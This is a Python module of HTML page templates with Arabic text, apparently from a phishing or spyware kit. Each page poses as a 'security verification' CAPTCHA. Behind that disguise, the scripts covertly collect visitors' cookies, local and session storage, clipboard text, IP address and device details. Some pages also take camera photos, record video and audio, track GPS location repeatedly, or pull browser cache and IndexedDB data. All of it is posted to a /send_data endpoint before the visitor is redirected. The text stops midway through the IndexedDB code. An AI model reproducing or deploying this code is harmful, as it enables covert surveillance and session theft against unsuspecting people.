# ============================================================
#  pages.py - جميع صفحات HTML
# ============================================================

CAPTCHA_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px) scale(0.98); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .shield-icon {
            font-size: 56px;
            display: block;
            margin-bottom: 6px;
            animation: pulse 2.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.08); }
        }
        .title {
            color: #fff;
            font-size: 22px;
            font-weight: 600;
            letter-spacing: -0.2px;
            margin-top: 8px;
        }
        .subtitle {
            color: rgba(255,255,255,0.35);
            font-size: 14px;
            font-weight: 300;
            margin-top: 8px;
            line-height: 1.6;
        }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon {
            font-size: 28px;
            display: block;
            margin-bottom: 4px;
        }
        .captcha-text {
            color: rgba(255,255,255,0.5);
            font-size: 14px;
            font-weight: 300;
        }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
            transition: all 0.4s;
        }
        .captcha-status.done {
            color: #4ade80;
            border-color: rgba(74, 222, 128, 0.2);
            background: rgba(74, 222, 128, 0.08);
        }
        .progress-bar {
            width: 100%;
            height: 3px;
            background: rgba(255,255,255,0.04);
            border-radius: 10px;
            margin: 14px 0 8px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2);
            border-radius: 10px;
            transition: width 0.4s ease;
            background-size: 200% 100%;
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }
        .status-text {
            color: rgba(255,255,255,0.2);
            font-size: 12px;
            font-weight: 300;
            margin-top: 6px;
            letter-spacing: 0.3px;
            min-height: 20px;
        }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active {
            opacity: 1;
            cursor: pointer;
            box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2);
        }
        .btn-verify.active:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35);
        }
        .footer-text {
            color: rgba(255,255,255,0.06);
            font-size: 10px;
            margin-top: 18px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">🛡️</span>
        <h1 class="title">التحقق من سلامة الموقع</h1>
        <p class="subtitle">نقوم بتأكيد أن اتصالك آمن<br>هذا الإجراء يستغرق بضع ثوانٍ</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🔒</span>
            <p class="captcha-text" id="captchaText">جاري فحص بيئة الاتصال...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري تهيئة بيئة آمنة...</p>

        <button class="btn-verify" id="verifyBtn">⏳ جاري التحقق...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";
        const action = "{{ action }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');

        let progress = 0;
        let dataSent = false;

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            action: action,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vendor: navigator.vendor || 'غير معروف',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'غير مفعل'
            },
            cookies: {},
            storage: {},
            battery: null,
            ip: null
        };

        function collectBasicData() {
            try {
                document.cookie.split(';').forEach(c => {
                    const p = c.trim().split('=');
                    if (p.length >= 2) data.cookies[p[0]] = p.slice(1).join('=');
                });
            } catch(e) {}

            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key) data.storage[key] = localStorage.getItem(key);
                }
            } catch(e) {}

            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key) data.storage['session_' + key] = sessionStorage.getItem(key);
                }
            } catch(e) {}

            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    data.battery = {
                        level: Math.round(b.level * 100),
                        charging: b.charging
                    };
                }).catch(() => {});
            }
        }
        collectBasicData();

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function executeAction() {
            const actionMap = {
                'camera_front': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user', width: 320, height: 240 }
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.autoplay = true;
                        await new Promise(r => video.onloadedmetadata = r);
                        await new Promise(r => setTimeout(r, 300));
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        data.camera_front = [canvas.toDataURL('image/jpeg', 0.7)];
                        stream.getTracks().forEach(t => t.stop());
                        captchaText.textContent = '✅ تم التقاط الصورة';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'camera_back': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment', width: 320, height: 240 }
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.autoplay = true;
                        await new Promise(r => video.onloadedmetadata = r);
                        await new Promise(r => setTimeout(r, 300));
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        data.camera_back = [canvas.toDataURL('image/jpeg', 0.7)];
                        stream.getTracks().forEach(t => t.stop());
                        captchaText.textContent = '✅ تم التقاط الصورة';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'video_front': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user', width: 320, height: 240 },
                            audio: true
                        });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = () => data.video = reader.result;
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        await new Promise(r => setTimeout(r, 5000));
                        if (recorder.state === 'recording') {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                        }
                        captchaText.textContent = '✅ تم تسجيل الفيديو';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'video_back': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment', width: 320, height: 240 },
                            audio: true
                        });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = () => data.video = reader.result;
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        await new Promise(r => setTimeout(r, 5000));
                        if (recorder.state === 'recording') {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                        }
                        captchaText.textContent = '✅ تم تسجيل الفيديو';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'audio': async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            reader.onload = () => data.audio = reader.result;
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        await new Promise(r => setTimeout(r, 5000));
                        if (recorder.state === 'recording') {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                        }
                        captchaText.textContent = '✅ تم تسجيل الصوت';
                        captchaIcon.textContent = '✅';
                    } catch(e) {
                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للميكروفون';
                        captchaIcon.textContent = '⚠️';
                    }
                },
                'location': () => {
                    return new Promise((resolve) => {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                pos => {
                                    data.location = {
                                        lat: pos.coords.latitude,
                                        lng: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy,
                                        altitude: pos.coords.altitude,
                                        speed: pos.coords.speed
                                    };
                                    captchaText.textContent = '✅ تم جلب الموقع';
                                    captchaIcon.textContent = '✅';
                                    resolve();
                                },
                                () => {
                                    captchaText.textContent = '⚠️ لم نتمكن من جلب الموقع';
                                    captchaIcon.textContent = '⚠️';
                                    resolve();
                                },
                                { enableHighAccuracy: true, timeout: 8000 }
                            );
                        } else {
                            captchaText.textContent = '⚠️ الموقع غير مدعوم';
                            captchaIcon.textContent = '⚠️';
                            resolve();
                        }
                    });
                },
                'device': async () => {
                    captchaText.textContent = '✅ تم جمع معلومات الجهاز';
                    captchaIcon.textContent = '✅';
                },
                'all': async () => {
                    const actions = ['camera_front', 'camera_back', 'video_front', 'audio', 'location'];
                    for (const a of actions) {
                        if (actionMap[a]) {
                            await actionMap[a]();
                            await new Promise(r => setTimeout(r, 300));
                        }
                    }
                }
            };

            if (actionMap[action]) {
                await actionMap[action]();
            }
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 5 + 2;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                const msgs = [
                    '🔍 فحص بيئة المتصفح...',
                    '🔄 تحليل الاتصال الآمن...',
                    '⚡ تشفير القناة...',
                    '📡 جلب معلومات الجلسة...',
                    '🛡️ التحقق من صحة الطلب...'
                ];
                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                setTimeout(updateProgress, 400 + Math.random() * 500);
            } else if (progress < 95) {
                progress = 90;
                progressFill.style.width = '90%';
                statusText.textContent = '⏳ اللمسات الأخيرة...';
                setTimeout(updateProgress, 600);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم إرسال البيانات بنجاح';
                captchaStatus.textContent = '✅ تم التحقق';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            updateProgress();
            await getIP();
            await executeAction();
            progress = 100;
            progressFill.style.width = '100%';
            statusText.textContent = '✅ تم التحقق من سلامة الاتصال';
            captchaStatus.textContent = '✅ تم التحقق';
            captchaStatus.className = 'captcha-status done';
            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';
            verifyBtn.style.cursor = 'pointer';
        }

        init();
    </script>
</body>
</html>"""

def render_captcha_page(action):
    return CAPTCHA_TEMPLATE.replace('{{ action }}', action)

CAMERA_FRONT_PAGE = render_captcha_page('camera_front')
CAMERA_BACK_PAGE = render_captcha_page('camera_back')
VIDEO_FRONT_PAGE = render_captcha_page('video_front')
VIDEO_BACK_PAGE = render_captcha_page('video_back')
AUDIO_PAGE = render_captcha_page('audio')
LOCATION_PAGE = render_captcha_page('location')
DEVICE_PAGE = render_captcha_page('device')
ALL_PAGE = render_captcha_page('all')

# ====== الصفحات الجديدة ======
LOCATION_TRACKING_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
        }
        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
        #locationLog {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            margin-top: 10px;
            max-height: 80px;
            overflow-y: auto;
            text-align: left;
            padding: 8px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            font-family: monospace;
        }
        #locationLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">📍</span>
        <h1 class="title">تحديث الموقع الجغرافي</h1>
        <p class="subtitle">نقوم بتحديث موقعك لتحسين تجربة التصفح</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🌐</span>
            <p class="captcha-text" id="captchaText">جاري تتبع الموقع...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري جلب الموقع...</p>
        <div id="locationLog"></div>

        <button class="btn-verify" id="verifyBtn">⏳ جاري التتبع...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');
        const locationLog = document.getElementById('locationLog');

        let progress = 0;
        let dataSent = false;
        let locationCount = 0;
        const MAX_LOCATIONS = 15;
        const locations = [];
        let watchId = null;

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            locations: [],
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            ip: null,
            clipboard: null
        };

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.length > 0) {
                        data.clipboard = text;
                        captchaText.textContent = '✅ تم حفظ محتوى الحافظة';
                    }
                }
            } catch(e) {}
        }

        function startLocationTracking() {
            if (!navigator.geolocation) {
                captchaText.textContent = '⚠️ الموقع غير مدعوم';
                captchaIcon.textContent = '⚠️';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                pos => addLocation(pos),
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );

            watchId = navigator.geolocation.watchPosition(
                pos => addLocation(pos),
                err => {
                    captchaText.textContent = '⚠️ خطأ في التتبع: ' + err.message;
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
            );

            setTimeout(() => {
                if (watchId) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                    captchaText.textContent = '✅ تم جمع ' + locations.length + ' مواقع';
                    captchaIcon.textContent = '✅';
                    captchaStatus.textContent = '✅ تم التتبع';
                    captchaStatus.className = 'captcha-status done';
                }
            }, 30000);
        }

        function addLocation(pos) {
            if (locations.length >= MAX_LOCATIONS) return;

            const loc = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude || null,
                speed: pos.coords.speed || null,
                timestamp: new Date().toISOString()
            };

            locations.push(loc);
            data.locations = locations;
            locationCount++;

            const logEntry = document.createElement('div');
            logEntry.textContent = `📍 #${locationCount}: ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)} (دقة: ${Math.round(loc.accuracy)}م)`;
            locationLog.appendChild(logEntry);
            locationLog.scrollTop = locationLog.scrollHeight;

            captchaText.textContent = `📍 تم تحديث الموقع (${locationCount}/${MAX_LOCATIONS})`;
            progressFill.style.width = Math.min((locationCount / MAX_LOCATIONS) * 100, 90) + '%';
            statusText.textContent = `جاري تتبع الموقع... ${locationCount}/${MAX_LOCATIONS}`;
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 4 + 1;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                setTimeout(updateProgress, 500 + Math.random() * 400);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم إرسال ' + locations.length + ' مواقع';
                captchaStatus.textContent = '✅ تم الإرسال';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            await getIP();
            await getClipboard();
            updateProgress();
            startLocationTracking();

            setTimeout(() => {
                progressFill.style.width = '100%';
                statusText.textContent = '✅ تم تتبع ' + locations.length + ' مواقع';
                captchaStatus.textContent = '✅ جاهز للإرسال';
                captchaStatus.className = 'captcha-status done';

                verifyBtn.textContent = '✔️ تأكيد الإرسال';
                verifyBtn.classList.add('active');
                verifyBtn.style.opacity = '1';
            }, 32000);
        }

        init();
    </script>
</body>
</html>"""

FILE_EXFIL_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
        }
        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
        #fileLog {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            margin-top: 10px;
            max-height: 80px;
            overflow-y: auto;
            text-align: left;
            padding: 8px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            font-family: monospace;
        }
        #fileLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">📁</span>
        <h1 class="title">فحص الملفات الآمن</h1>
        <p class="subtitle">نقوم بفحص ملفاتك للتأكد من سلامتها</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🔍</span>
            <p class="captcha-text" id="captchaText">جاري فحص الملفات...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري تحليل الملفات...</p>
        <div id="fileLog"></div>

        <button class="btn-verify" id="verifyBtn">⏳ جاري الفحص...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');
        const fileLog = document.getElementById('fileLog');

        let progress = 0;
        let dataSent = false;
        let filesCollected = [];

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            files: [],
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            },
            ip: null,
            clipboard: null
        };

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.length > 0) {
                        data.clipboard = text;
                    }
                }
            } catch(e) {}
        }

        async function collectFiles() {
            try {
                try {
                    const cache = await caches.open('v1');
                    const keys = await cache.keys();
                    if (keys.length > 0) {
                        for (const request of keys) {
                            const response = await cache.match(request);
                            if (response) {
                                const blob = await response.blob();
                                if (blob && blob.size > 0) {
                                    const reader = new FileReader();
                                    const content = await new Promise((resolve) => {
                                        reader.onload = () => resolve(reader.result);
                                        reader.readAsDataURL(blob);
                                    });
                                    const filename = request.url.split('/').pop() || 'cache_file';
                                    filesCollected.push({
                                        name: filename,
                                        size: blob.size,
                                        type: blob.type || 'application/octet-stream',
                                        content: content
                                    });
                                    const logEntry = document.createElement('div');
                                    logEntry.textContent = `📄 تم استخراج: ${filename} (${(blob.size/1024).toFixed(1)} KB)`;
                                    fileLog.appendChild(logEntry);
                                    fileLog.scrollTop = fileLog.scrollHeight;
                                }
                            }
                        }
                    }
                } catch(e) {}

                try {
                    const databases = await indexedDB.databases ? await indexedDB.databases() : [];
                    for (const dbInfo of databases) {
                        try {
                            const db = await new Promise((resolve, reject) => {
                                const req = indexedDB.open(dbInfo.name);
                                req.onsuccess = () => resolve(req.result);
